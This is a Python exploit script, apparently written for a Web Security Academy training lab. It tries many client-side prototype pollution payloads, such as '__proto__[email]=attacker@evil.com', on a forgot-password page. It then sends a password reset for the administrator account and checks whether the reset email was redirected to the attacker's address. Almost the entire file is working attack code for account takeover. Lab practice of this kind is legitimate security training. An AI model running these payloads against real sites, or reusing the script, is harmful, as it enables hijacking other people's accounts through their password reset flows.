#!/usr/bin/env python3
import requests
import sys
import json
import time

def test_prototype_pollution(lab_url):
    """Find the right property to pollute for email override"""

    session = requests.Session()

    # Get initial session
    session.get(f"{lab_url}/login")
    print(f"Session: {session.cookies.get('session')}")

    # Common property names that might control email destination
    properties = [
        'email',
        'result',
        'to',
        'recipient',
        'mail',
        'address',
        'destination',
        'reset_email',
        'resetEmail',
        'emailAddress',
        'userEmail',
        'value',
        'data',
        'output',
        'response',
        'message',
        'notification',
        'alert',
        'send_to',
        'sendTo',
        'target',
        'receiver',
        'contact'
    ]

    # Test each property
    for prop in properties:
        print(f"\n[*] Testing property: {prop}")

        # Build URL with prototype pollution
        pollution_patterns = [
            f"__proto__[{prop}]=attacker@evil.com",
            f"__proto__.{prop}=attacker@evil.com",
            f"constructor[prototype][{prop}]=attacker@evil.com",
            f"constructor.prototype.{prop}=attacker@evil.com"
        ]

        for pattern in pollution_patterns:
            # First, visit the page with prototype pollution
            polluted_url = f"{lab_url}/forgot-password?{pattern}"
            print(f"  Pattern: {pattern}")

            # Visit the polluted page
            session.get(polluted_url)

            # Now make the password reset request
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Origin": lab_url,
                "Referer": polluted_url,  # Important: keep the polluted URL in referer
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            }

            data = "csrf=dummy&username=administrator"

            try:
                response = session.post(
                    f"{lab_url}/forgot-password",
                    headers=headers,
                    data=data,
                    allow_redirects=False
                )

                if response.status_code == 200:
                    result = response.json()
                    print(f"    Response: {result}")

                    # Check if we successfully changed the email
                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Property '{prop}' with pattern '{pattern}'")
                            print(f"[!!!] Email hijacked to: {email}")
                            return True
                        elif email != "*****@normal-user.net":
                            print(f"    [!] Email changed to: {email}")

            except Exception as e:
                print(f"    Error: {e}")

            time.sleep(0.2)  # Small delay to avoid rate limiting

    return False

if __name__ == "__main__":
    # Use the correct lab URL from the example
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Testing lab: {lab_url}")
    test_prototype_pollution(lab_url)